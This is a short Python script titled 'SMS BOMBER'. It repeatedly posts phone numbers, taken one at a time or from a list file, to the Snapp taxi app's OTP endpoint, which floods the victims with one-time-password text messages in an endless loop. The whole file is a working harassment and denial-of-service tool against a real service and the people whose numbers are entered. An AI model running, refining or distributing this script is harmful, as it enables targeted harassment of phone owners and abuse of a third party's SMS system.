#!/usr/bin/env/python3

#imports
from colorama import Fore
import subprocess
import requests
import platform
import json
import time 
osname = platform.uname()[0]
def clear():
    if osname == 'Windows':
        subprocess.call(("cls"),shell=True)
    else:
        subprocess.call(("clear"),shell=True)

clear()

def sendsms(number):
    payload = {
        "cellphone":number
    }
    result = requests.post(
    'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp/',
    data=payload
    )
    # print(result.text)
    if result.status_code == 200:
        status = True
    else:
        status = False
        
    return status


def start():
    print("\n SMS BOMBER")
    print("""
    1) Single PHONE Number   2) Combo
""")
    num = input("$ ")

    if num == "1":
        print("\n\nPlease Enter Number:")
        print("Example: +981234567890\n")
        
        cellphone = input("$ ")
        print("")
        while True:
            try:
                start_sms = sendsms(cellphone)
                
                if start_sms == True:
                    print("SMS Send To: "+cellphone)
                else:
                    print("Cannot able to find the phone number")
            except:
                print("\nstoping process ...")
                break
        input("\nBack To Menu (Press Enter) ")
    
    elif num == "2":
        print("\n\n Please Enter Phone Number List!!!")
        phone_list = input("Enter the path for the list: ")
        try:
            phone_list = open(phone_list, mode='r').read().split()
        
        except FileNotFoundError:
            print("Phone List Not Found")
            print("Back To Menu (Press Enter) ")
            phone_list = []
            
        print("")

        while True:
            try:
                if not len(phone_list) == 0:
                    for number in phone_list:
                        start_sms = sendsms(number)

                        if start_sms == True:
                            print("Sms Send To: "+ number)
                        else:
                            print("cannot able to find the {number}")
                else:
                    break
            except KeyboardInterrupt:
                print("\nstopping process...")
                input("Back To Menu (Pess Enter)")

while True:
    try:
        start()
    except KeyboardInterrupt:
        print("Good Bye...")
        break